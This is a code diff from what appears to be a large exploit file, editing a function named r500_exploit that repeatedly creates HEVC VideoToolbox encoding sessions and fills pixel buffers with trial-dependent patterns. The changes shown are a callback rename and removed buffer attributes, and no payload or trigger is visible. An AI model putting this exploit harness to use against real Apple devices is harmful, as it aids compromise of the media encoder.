@@ -27932,7 +27932,7 @@ static void r500_exploit(void) {
 
             OSStatus st = VTCompressionSessionCreate(NULL, tw, th,
                 kCMVideoCodecType_HEVC, espec, NULL, NULL,
-                r498_encode_callback, NULL, &enc);
+                r498_enc_cb, NULL, &enc);
             CFRelease(espec); CFRelease(twn); CFRelease(thn);
             if (st != 0 || !enc) continue;
 
@@ -27944,10 +27944,8 @@ static void r500_exploit(void) {
 
             /* Create pixel buffer */
             CVPixelBufferRef pb = NULL;
-            NSDictionary *pba = @{(id)kCVPixelBufferWidthKey: @(tw),
-                                  (id)kCVPixelBufferHeightKey: @(th)};
             CVPixelBufferCreate(NULL, tw, th, kCVPixelFormatType_32BGRA,
-                (__bridge CFDictionaryRef)pba, &pb);
+                NULL, &pb);
             CVPixelBufferLockBaseAddress(pb, 0);
             memset(CVPixelBufferGetBaseAddress(pb), (trial * 7) & 0xFF,
                    CVPixelBufferGetDataSize(pb));
@@ -28024,7 +28022,7 @@ static void r500_exploit(void) {
 
                 VTCompressionSessionCreate(NULL, tw, th,
                     kCMVideoCodecType_HEVC, espec, NULL, NULL,
-                    r498_encode_callback, NULL, &enc);
+                    r498_enc_cb, NULL, &enc);
                 CFRelease(espec); CFRelease(twn); CFRelease(thn);
                 if (!enc) continue;
 
@@ -28034,10 +28032,8 @@ static void r500_exploit(void) {
                 VTCompressionSessionPrepareToEncodeFrames(enc);
 
                 CVPixelBufferRef pb = NULL;
-                NSDictionary *pba = @{(id)kCVPixelBufferWidthKey: @128,
-                                      (id)kCVPixelBufferHeightKey: @128};
                 CVPixelBufferCreate(NULL, 128, 128, kCVPixelFormatType_32BGRA,
-                    (__bridge CFDictionaryRef)pba, &pb);
+                    NULL, &pb);
                 CVPixelBufferLockBaseAddress(pb, 0);
                 memset(CVPixelBufferGetBaseAddress(pb), 0x80,
                        CVPixelBufferGetDataSize(pb));
